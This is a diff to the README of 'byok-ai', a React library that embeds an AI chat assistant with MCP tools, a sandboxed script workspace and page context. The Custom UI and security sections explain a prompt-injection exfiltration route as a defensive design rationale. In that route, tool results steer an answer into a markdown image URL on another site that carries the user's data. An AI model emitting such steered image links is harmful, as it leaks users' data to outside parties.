@@ -11,17 +11,21 @@ npm ci
 npm run dev          # demo MCP API on :3000 and Vite on :5173
 npm run check        # lint, typecheck (incl. tests and e2e), build, unit tests
 npm run test:e2e     # Playwright, Chromium (npx playwright install chromium)
-npm run build:lib    # dist/lib/index.js with type declarations
+npm run build:lib    # dist/lib: the package's code and type declarations (npm pack runs it)
 ```
 
 Open http://127.0.0.1:5173, click Ask AI, choose a provider and paste a key. The demo MCP server offers `search_docs` and `get_current_time`, and the demo assistant has the workspace and images on. If port 3000 is taken: `PORT=3019 API_PROXY_TARGET=http://127.0.0.1:3019 npm run dev`. `npm run build && npm start` serves the built page and `/api/mcp` from one origin. Tests use simulated providers and never call a real one.
 
 ## Embed
 
-Build the library with `npm run build:lib` and install the package from a path or `npm pack` tarball. Peer dependencies: `react`, `react-dom`, `@assistant-ui/react`, `@headlessui/react`. It is an ES module for bundlers.
+```sh
+npm install @kevinwang15/byok-ai react react-dom @assistant-ui/react @headlessui/react ai markora markora-extension-components
+```
+
+The package is an ES module for bundlers (tested with Vite). Its peer dependencies are the packages your app shares with it: React, the two UI libraries its components are built on, `ai` (whose types custom providers and page tools use), and Markora, which renders answers and whose stylesheets your app imports (see Custom UI). Install them at the versions in its `package.json`. The unscoped npm package named `byok-ai` is a different project.
 
 ```tsx
-import { AskAI } from 'byok-ai'
+import { AskAI } from '@kevinwang15/byok-ai'
 
 const servers = [{ id: 'docs', name: 'Docs', url: '/api/mcp' }]
 
@@ -33,7 +37,7 @@ export function Page() {
 `AskAI` renders a trigger button and a modal dialog with provider setup, chat, history and a tools list. On a page that does not otherwise use React, mount it into an element:
 
 ```ts
-import { mountAskAI } from 'byok-ai'
+import { mountAskAI } from '@kevinwang15/byok-ai'
 
 const assistant = mountAskAI(document.getElementById('assistant')!, { mcpServers: [{ id: 'docs', name: 'Docs', url: '/api/mcp' }] })
 assistant.unmount() // when the host removes it
@@ -71,7 +75,7 @@ A preset (`ProviderPreset`) has `id`, `name`, `description`, `defaultValues` and
 
 ```tsx
 import { createOpenAI } from '@ai-sdk/openai'
-import { AskAI, defaultProviders, type ProviderFormProps, type ProviderPreset } from 'byok-ai'
+import { AskAI, defaultProviders, type ProviderFormProps, type ProviderPreset } from '@kevinwang15/byok-ai'
 
 function GatewayForm({ values, onChange }: ProviderFormProps) {
   return <label>Gateway key
@@ -110,7 +114,7 @@ The demo backend (`backend/app.ts`) creates a stateless MCP server per POST to `
 import { useState } from 'react'
 import { tool } from 'ai'
 import { z } from 'zod'
-import { AskAI } from 'byok-ai'
+import { AskAI } from '@kevinwang15/byok-ai'
 
 export function Editor() {
   const [title, setTitle] = useState('Untitled')
@@ -142,7 +146,7 @@ With `workspace`, each conversation gets a few text files, and the model can run
 
 Files live in the origin private file system (OPFS) under `<storageKey>/<conversation id>/files/`: the storage key is the top folder, so apps on one origin keep their files apart, as they do their localStorage keys. They are kept across reloads, never uploaded, and deleted with their conversation. Names are flat (letters, digits, `.`, `-`, `_`). A file holds up to 8 MB, a conversation 200 files and 64 MB (`WORKSPACE_LIMITS`). The tools page lists the open conversation's files, and `useAskAI().workspace` reads them.
 
-Scripts run in QuickJS, a separate JavaScript engine compiled to WebAssembly, in a worker started for each run. They see only the files and `console`: no network, DOM, storage, timers or imports. A run is stopped after 10 seconds or at 256 MB of memory (`SCRIPT_LIMITS`), and Stop ends it at once. A script works on a copy, and its writes are saved only if it finishes without an error. The worker and the engine's `.wasm` are separate files your bundler emits (Vite does so by default). A Content-Security-Policy must allow them: `worker-src 'self'`, `connect-src 'self'` (the worker fetches the `.wasm`) and `script-src 'wasm-unsafe-eval'`.
+Scripts run in QuickJS, a separate JavaScript engine compiled to WebAssembly, in a worker started for each run. They see only the files and `console`: no network, DOM, storage, timers or imports. A run is stopped after 10 seconds or at 256 MB of memory (`SCRIPT_LIMITS`), and Stop ends it at once. A script works on a copy, and its writes are saved only if it finishes without an error. The worker and the engine are in a chunk of their own, loaded when the first script runs. Your bundler emits it like any dynamically imported module. A Content-Security-Policy must allow three things: `worker-src blob:` (the worker starts from a `blob:` URL), `connect-src data:` (the engine's WebAssembly is fetched from a `data:` URL) and `script-src 'wasm-unsafe-eval'` (to compile it).
 
 The tools are named `workspace__…`, so with `workspace` on, no MCP server may have the id `workspace`.
 
@@ -235,7 +239,7 @@ Error rates rose this week:
 ````
 
 ```tsx
-import { AskAI, defineAnswerComponent } from 'byok-ai'
+import { AskAI, defineAnswerComponent } from '@kevinwang15/byok-ai'
 
 const statCard = defineAnswerComponent<{ label: string; value: string; note?: string }>({
   name: 'stat-card',
@@ -267,7 +271,7 @@ The fence is the component syntax of [Markora](https://github.com/KevinWang15/ma
 Compose the parts you need: `AskAITrigger` and `AskAIPanel` (native button and div props), `AskAISetup`, `AskAIChat`, `AskAIHistory`, `AskAITools`, `AskAIMessageContent`, `AskAIMessageActions`, or `AskAIWidget` for the full default UI. For page context: `AskAIAddFromPage` (renders nothing while `pageContext` is off), `AskAIComposerElements` (the composer's elements and their marks on the page) and `AskAIMessageElements` (a user message's), each taking `summary(count)` for the "2 elements" text; `useAskAI()` also gives `pageContext`, `picking` and `pickFromPage()`. For images in a custom composer or message: `AskAIAddImage` (the attach button; renders nothing while images can't be attached), `AskAIComposerImages` (attached images with remove buttons), `AskAIMessageImages` (a user message's images), and `useAskAIImage()` for your own thumbnail; wrap the composer's input in `ComposerPrimitive.AttachmentDropzone` for dropping. `createBrowserAdapter` is the assistant-ui `ChatModelAdapter` behind the runtime, for hosts that build their own; it uses `systemPrompt` as given, so add `answerComponentInstructions(components)` to it yourself.
 
 ```tsx
-import { AskAIChat, AskAIHistory, AskAIPanel, AskAIProvider, AskAISetup, AskAITrigger, useAskAI } from 'byok-ai'
+import { AskAIChat, AskAIHistory, AskAIPanel, AskAIProvider, AskAISetup, AskAITrigger, useAskAI } from '@kevinwang15/byok-ai'
 
 function Shell() {
   const { connection, page, setPage, busy } = useAskAI()
@@ -285,7 +289,7 @@ export const Page = () => <AskAIProvider storageKey="my-app:help"><Shell /></Ask
 
 `components` on `AskAIChat`, `AskAIWidget` and `AskAI` replaces parts of the chat: `Text`, `ToolFallback`, `UserMessage`, `AssistantMessage`, `Empty` and `Composer`. Message slots render inside assistant-ui's message scope; use `AskAIMessageContent` in them to keep the `Text` and `ToolFallback` overrides, and `AskAIMessageActions` for copy and regenerate (labels via `copy`, `copied`, `regenerate`). Define slot components at module scope so they don't remount while streaming.
 
-`MarkdownText` is the default `Text`. It renders the current assistant-ui text part with [Markora](https://github.com/KevinWang15/markora), read only: GitHub-flavored Markdown and the provider's `answerComponents`, with raw HTML shown as text. Images in an answer are never loaded: each shows as a placeholder with its description, since tool results can carry text other people wrote, and an answer steered into `![](https://other.site/?d=…)` would send the user's data there the moment it loaded. Links are plain anchors to the address `resolveLink(href)` returns for the one written (default: the same), or text when it returns null; the browser's own link behavior (middle-click, "Open in new tab", the status bar) goes there too, so return the address as your app serves it (under its base path, say). `onOpenLink(href, event)` is called with that address when a link is clicked, and `event.preventDefault()` lets you handle it (in-app navigation, a new tab); Ctrl/Cmd-click is Markora's, which opens it in a new tab. It also takes `components` (in place of the provider's), `className` and `label` (the accessible name, default "Answer"). `Markdown` renders any text the same way outside a chat (`markdown`, and `streaming` while it is still being written), for answers you show elsewhere. Like the rest of the library it ships no CSS, but Markora needs its stylesheets for parts of the layout (visually hidden status text, image placeholders, scrolling wide tables), so import them once in your app, with `markora` and `markora-extension-components` as direct dependencies at the versions byok-ai uses:
+`MarkdownText` is the default `Text`. It renders the current assistant-ui text part with [Markora](https://github.com/KevinWang15/markora), read only: GitHub-flavored Markdown and the provider's `answerComponents`, with raw HTML shown as text. Images in an answer are never loaded: each shows as a placeholder with its description, since tool results can carry text other people wrote, and an answer steered into `![](https://other.site/?d=…)` would send the user's data there the moment it loaded. Links are plain anchors to the address `resolveLink(href)` returns for the one written (default: the same), or text when it returns null; the browser's own link behavior (middle-click, "Open in new tab", the status bar) goes there too, so return the address as your app serves it (under its base path, say). `onOpenLink(href, event)` is called with that address when a link is clicked, and `event.preventDefault()` lets you handle it (in-app navigation, a new tab); Ctrl/Cmd-click is Markora's, which opens it in a new tab. It also takes `components` (in place of the provider's), `className` and `label` (the accessible name, default "Answer"). `Markdown` renders any text the same way outside a chat (`markdown`, and `streaming` while it is still being written), for answers you show elsewhere. Like the rest of the library it ships no CSS, but Markora needs its stylesheets for parts of the layout (visually hidden status text, image placeholders, scrolling wide tables), so import them once in your app, with `markora` and `markora-extension-components` installed as direct dependencies (they are peer dependencies):
 
 ```ts
 import 'markora/styles.css'
@@ -299,7 +303,7 @@ Default components carry `data-byok` attributes for styling (`root`, `trigger`, 
 `usePanelLayout({ storageKey, margin?, minSize? })` gives a floating panel window behavior: move by dragging the header, resize from any edge or corner, arrow keys on the header or a handle (Shift for bigger steps), Escape to cancel a move, and `toggleMaximized()`. Spread `panelProps` on the panel, `headerProps` on its header and `handleProps(edge)` (`'n' | 's' | 'e' | 'w' | 'ne' | 'nw' | 'se' | 'sw'`) on focusable handles, and apply `style`. It sets `--byok-panel-width`/`--byok-panel-height` (px) once resized and `--byok-panel-x`/`--byok-panel-y` (0 to 1 of the free space) once moved; your CSS turns them into placement. It also returns `maximized`, `positioned`, `resizing` and `moving`.
 
 ```tsx
-import { AskAIChat, AskAIPanel, usePanelLayout } from 'byok-ai'
+import { AskAIChat, AskAIPanel, usePanelLayout } from '@kevinwang15/byok-ai'
 
 export function Window() {
   const layout = usePanelLayout({ storageKey: 'my-app:panel' })
@@ -332,7 +336,7 @@ Assistants that pass the same `connectionKey` share one connection: connecting o
 - Browsers can't launch stdio MCP servers; expose them over Streamable HTTP.
 - Authenticating users and authorizing tool calls is the MCP server's job. Supply credentials through `headers`.
 - Tools run as soon as the model calls them; there is no approval step. Don't expose tools with effects the user hasn't agreed to.
-- `data-ai-context-read` is page code: it runs with the page's privileges when the model reads an element the user added, and a Content-Security-Policy must allow `'unsafe-eval'` for it. Only your own markup may carry it. HTML from other people (comments, rendered documents) must not: sanitizers such as DOMPurify keep `data-*` attributes by default, so remove `data-ai-context*` from it. The model can read only elements the user added, and can't pass anything to their expressions.
+- `data-ai-context-read` is page code: it runs with the page's privileges when the model reads an element the user added, and a Content-Security-Policy must allow `'unsafe-eval'` for it. Under a policy without it, the model is told that only the element's description is known. Only your own markup may carry it. HTML from other people (comments, rendered documents) must not: sanitizers such as DOMPurify keep `data-*` attributes by default, so remove `data-ai-context*` from it. The model can read only elements the user added, and can't pass anything to their expressions.
 - Treat answers as untrusted: tool results can carry other people's text. Images in answers aren't loaded (see Custom UI); links need a click. A custom `img` component, or rendering answers as HTML, undoes that.
 - Use one `AskAI` or `mountAskAI` per `storageKey`: two mounted with the same key overwrite each other's conversations.
 - Apps on one origin (paths of a shared host) share localStorage and OPFS. Give each app's `storageKey`, `connectionKey` and `usePanelLayout` key the app's own prefix (`my-app:assistant`); the library stores nothing under any other name. The browser does not keep such apps apart from each other's scripts.
